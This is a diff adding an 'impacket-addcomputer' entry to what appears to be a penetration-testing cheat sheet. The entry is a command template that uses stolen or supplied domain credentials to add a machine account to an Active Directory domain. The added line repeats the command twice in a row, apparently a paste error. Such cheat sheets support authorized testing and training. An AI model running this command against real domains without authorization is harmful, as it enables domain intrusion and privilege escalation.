@@ -5403,6 +5403,12 @@ evil-winrm -i <RHOST> -c /PATH/TO/CERTIFICATE/<CERTIFICATE>.crt -k /PATH/TO/PRIV
 
 #### Impacket
 
+##### impacket-addcomputer
+
+```console
+impacket-addcomputer -dc-ip <RHOST> -computer-name <MACHINE_ACCOUNT> -computer-pass <PASSWORD> <DOMAIN>/<USERNAME>:<PASSWORD>$ impacket-addcomputer -dc-ip <RHOST> -computer-name <MACHINE_ACCOUNT> -computer-pass <PASSWORD> <DOMAIN>/<USERNAME>:<PASSWORD>
+```
+
 ##### impacket-atexec
 
 ```shell
